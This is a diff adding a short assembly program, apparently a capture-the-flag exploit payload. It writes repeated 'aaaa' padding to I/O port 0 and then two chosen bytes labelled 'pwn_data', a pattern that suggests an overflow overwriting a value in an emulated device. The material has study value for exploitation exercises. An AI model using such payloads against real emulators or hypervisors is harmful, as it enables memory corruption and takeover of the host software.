@@ -1,0 +1,33 @@
+
+
+mov al, 11
+
+enter_4_bytes:
+
+mov esi, data
+mov ecx, end_noob - data
+mov dx, 0
+rep outsb
+
+dec al
+jnz enter_4_bytes
+
+mov esi, pwn_data
+mov ecx, end_pwn - pwn_data
+mov dx, 0
+rep outsb 
+
+hlt
+
+data:
+db "aaaa"
+end_noob:
+
+pwn_data:
+db 0xa7
+db 0x10
+end_pwn:
+db 0xee
+db 0xee
+
+
